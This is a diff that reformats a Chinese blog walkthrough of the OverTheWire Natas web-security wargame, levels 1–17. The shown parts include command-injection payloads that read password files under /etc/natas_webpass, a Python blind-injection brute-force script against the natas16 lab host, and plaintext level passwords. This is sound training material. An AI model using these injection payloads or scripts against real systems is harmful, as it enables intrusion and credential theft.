@@ -1,17 +1,14 @@
 ---
-title: "Web安全入门靶场Natas通关详解(上)"
-date: "2022-06-07"
+title: 'Web安全入门靶场Natas通关详解(上)'
+date: '2022-06-07'
 tags: ['Web']
 draft: false
-summary: "本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的上半篇，主要包括第1-17关。"
+summary: '本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的上半篇，主要包括第1-17关。'
 ---
-
 
 简介：
 
 本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的上半篇，主要包括第1-17关。
-
-
 
 ### Level 0-1 入门
 
@@ -171,7 +168,7 @@ if($key != "") {
 因此，我只需要截断`grep`命令并拼接寻找密码所在位置的命令即可。因此我构造了如下的请求，直接回显natas10的密码。
 
 ```
-; cat ../../../../../etc/natas_webpass/natas9; 
+; cat ../../../../../etc/natas_webpass/natas9;
 ```
 
 ```
@@ -204,35 +201,35 @@ if($key != "") {
 
 1. **尝试构造不含有黑名单字符的注入命令**。观察该正则模式，可以看到是对`;|&`这三种常见命令分隔字符进行匹配，因此我们需要构造避免使用黑名单字符完成命令注入的方式。下面对常用的可以作为命令注入的特殊字符进行介绍。
 
-    + `;`最常用的多命令分隔符。中间出现的错误不会影响接下来的命令执行；
+   - `;`最常用的多命令分隔符。中间出现的错误不会影响接下来的命令执行；
 
-    + `&&`顺序执行被联立的多个命令，但是遇到错误会停止；
+   - `&&`顺序执行被联立的多个命令，但是遇到错误会停止；
 
-    + `||`顺序尝试被联立的多个命令，直到遇到可以执行成功的命令停止;
+   - `||`顺序尝试被联立的多个命令，直到遇到可以执行成功的命令停止;
 
-    + `|`管道机制，连结上个指令的标准输出，做为下个指令的标准输入；
+   - `|`管道机制，连结上个指令的标准输出，做为下个指令的标准输入；
 
-    + `&` 后台运行指令，表示将其后跟随的命令在后台执行；
+   - `&` 后台运行指令，表示将其后跟随的命令在后台执行；
 
-    + `<`标准输入重定向，从命令的执行结果或者文件输入；
+   - `<`标准输入重定向，从命令的执行结果或者文件输入；
 
-    + ``反引号表示命令引用，将其输出作为上级命令的输入；
+   - ``反引号表示命令引用，将其输出作为上级命令的输入；
 
-    + `$()`同样可以表示命令引用；
+   - `$()`同样可以表示命令引用；
 
-    因此，我们可以尝试后三种方式注入命令。
+   因此，我们可以尝试后三种方式注入命令。
 
-    ```
-    < $(ls /etc/natas_webpass/natas11)
-    . $(ls /etc/natas_webpass/natas11)
-    . `ls /etc/natas_webpass/natas11`
-    ```
+   ```
+   < $(ls /etc/natas_webpass/natas11)
+   . $(ls /etc/natas_webpass/natas11)
+   . `ls /etc/natas_webpass/natas11`
+   ```
 
 2. 利用原有的执行命令。我们可以看到原有执行命令就是grep，因此我们可以直接构造对目标文件的搜索。
 
-    ```
-    [a-zA-Z] /etc/natas_webpass/natas11
-    ```
+   ```
+   [a-zA-Z] /etc/natas_webpass/natas11
+   ```
 
 ```
 natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
@@ -249,11 +246,11 @@ natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 ```PHP
 function xor_encrypt_keyfinder($input, $output){
 	$key = '';
-	
+
 	for($i=0;$i<strlen($input);$i++) {
     	$key .= $input[$i] ^ $output[$i];
     }
-    
+
 	return $key;
 }
 
@@ -365,7 +362,7 @@ natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 ### Level 16: 命令注入之布尔盲注
 
-第16关属于第10关的进阶版，关键部分源代码如下所示。与第10关相比，第17关有两点不同。一是preg_match函数过滤了更多的字符包括`;`,`|`,`&`,反引号以及单双引号；二是我们的查询Key在passthru所执行的命令中被一对双引号包裹。 
+第16关属于第10关的进阶版，关键部分源代码如下所示。与第10关相比，第17关有两点不同。一是preg_match函数过滤了更多的字符包括`;`,`|`,`&`,反引号以及单双引号；二是我们的查询Key在passthru所执行的命令中被一对双引号包裹。
 
 ```PHP
 if($key != "") {
@@ -383,51 +380,51 @@ if($key != "") {
 
 1. 第一种思路是`Target[$position$]==$value$`，其中$$所包含的分别是目标字符串的位置和测试字符。在`bash`中有多种命令支持我们从文件打印指定位置的字符比如`awk`、`sed`、`cut`、`grep`、`dd`，对于字符串而言我们可以直接使用`${string:start:length}`获取，但是这些命令大多需要特殊字符的支持。
 
-    ```bash
-    cut -c 2 /etc/natas_webpass/natas17
-    pcregrep -o '(?<=^.{1}).{1}' /etc/natas_webpass/natas17 # pcre查询需要引号
-    dd bs=1 skip=0 count=1  if=/etc/natas_webpass/natas17 #会有额外输出
-    awk '{print substr($2)}' /etc/natas_webpass/natas17 # 需要引号
-    echo ${string:start:length} | $string='xxxxxxx' #针对字符串
-    ```
+   ```bash
+   cut -c 2 /etc/natas_webpass/natas17
+   pcregrep -o '(?<=^.{1}).{1}' /etc/natas_webpass/natas17 # pcre查询需要引号
+   dd bs=1 skip=0 count=1  if=/etc/natas_webpass/natas17 #会有额外输出
+   awk '{print substr($2)}' /etc/natas_webpass/natas17 # 需要引号
+   echo ${string:start:length} | $string='xxxxxxx' #针对字符串
+   ```
 
-    此外，在bash下直接比较字符串或者对应转化的编码比较困难。在本题中我没有找到特别好的方式来比较字符串，之后有机会再补充。如果不比较，而直接用原语句查询的话，数字是没有办法查到的，因为dictionary.txt中没有数字。
+   此外，在bash下直接比较字符串或者对应转化的编码比较困难。在本题中我没有找到特别好的方式来比较字符串，之后有机会再补充。如果不比较，而直接用原语句查询的话，数字是没有办法查到的，因为dictionary.txt中没有数字。
 
-    ```bash
-    grep -i "$(cut -c $1$ /etc/natas_webpass/natas17)" dictionary.txt
-    ```
+   ```bash
+   grep -i "$(cut -c $1$ /etc/natas_webpass/natas17)" dictionary.txt
+   ```
 
 2. 第二种思路更加巧妙，可以表示为`find $value$ in Target`。其中value是逐渐累加的，也就是说首先猜第一个字符，然后把正确的第一个字符作为\$value\$前缀再去猜第二个字符，以此类推。还需要思考的是找到与否的结果需要再页面可以显示，也就是构造一个恰当的开关函数。本题中的构造方式如下：
 
-    首先`hacker`是dictionary.txt中的一个单词，因此当`$()`内的命令无返回值时，该语句的返回结果应该是`hacker`在`dictionary.txt`的查询结果。我们使用正则匹配去探测密码的每一位(\$a\$处为爆破位)，如果该密码确实是以a开头，则返回值将为整个密码。此时整个密码拼接至hacker后在dictionary.txt中查询肯定是空，所以返回页面将不同。
+   首先`hacker`是dictionary.txt中的一个单词，因此当`$()`内的命令无返回值时，该语句的返回结果应该是`hacker`在`dictionary.txt`的查询结果。我们使用正则匹配去探测密码的每一位(\$a\$处为爆破位)，如果该密码确实是以a开头，则返回值将为整个密码。此时整个密码拼接至hacker后在dictionary.txt中查询肯定是空，所以返回页面将不同。
 
-    ```bash
-    grep -i "$(grep -E ^$a$.* /etc/natas_webpass/natas17)hacker" dictionary.txt
-    ```
+   ```bash
+   grep -i "$(grep -E ^$a$.* /etc/natas_webpass/natas17)hacker" dictionary.txt
+   ```
 
-    具体的脚本如下所示。
+   具体的脚本如下所示。
 
-    ```python
-    #!/bin/python
-    import requests,string
-    
-    url = "http://natas16.natas.labs.overthewire.org"
-    auth_username = "natas16"
-    auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
-    
-    characters = ''.join([string.ascii_letters,string.digits])
-    
-    password = []
-    for i in range(1,34):
-        for char in characters:
-            uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
-            r = requests.get(uri, auth=(auth_username,auth_password))
-            if 'hackers' not in r.text:
-                password.append(char)
-                print(''.join(password))
-                break
-            else: continue
-    ```
+   ```python
+   #!/bin/python
+   import requests,string
+
+   url = "http://natas16.natas.labs.overthewire.org"
+   auth_username = "natas16"
+   auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+   characters = ''.join([string.ascii_letters,string.digits])
+
+   password = []
+   for i in range(1,34):
+       for char in characters:
+           uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
+           r = requests.get(uri, auth=(auth_username,auth_password))
+           if 'hackers' not in r.text:
+               password.append(char)
+               print(''.join(password))
+               break
+           else: continue
+   ```
 
 ```
 natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
@@ -454,5 +451,5 @@ SELECT * from users where username="natas18" and ascii(substr((SELECT password f
 根据response received time我们即可得到password的每个位置对应的字符的ascii码。
 
 ```
-natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 
+natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
